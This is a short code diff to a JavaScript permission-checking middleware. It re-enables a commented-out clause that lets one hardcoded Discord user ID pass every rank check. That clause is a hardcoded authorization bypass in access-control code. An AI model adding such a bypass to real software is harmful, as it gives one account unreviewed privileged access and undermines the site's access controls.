@@ -224,7 +224,7 @@ const requirePermission = (rankRequired) => (req, res, next) => { //(rankRequire
 				res.status(403).send('Not authenticated');
 			} else {
 				if (req.user !== undefined) {
-					if (rankList.indexOf(row.Rank) >= rankList.indexOf(rankRequired) /*|| req.user.discordId === '219185683447808001'*/) {
+					if (rankList.indexOf(row.Rank) >= rankList.indexOf(rankRequired) || req.user.discordId === '219185683447808001') {
 						console.log("requirePermission PASSED!");
 						next();
 					} else {
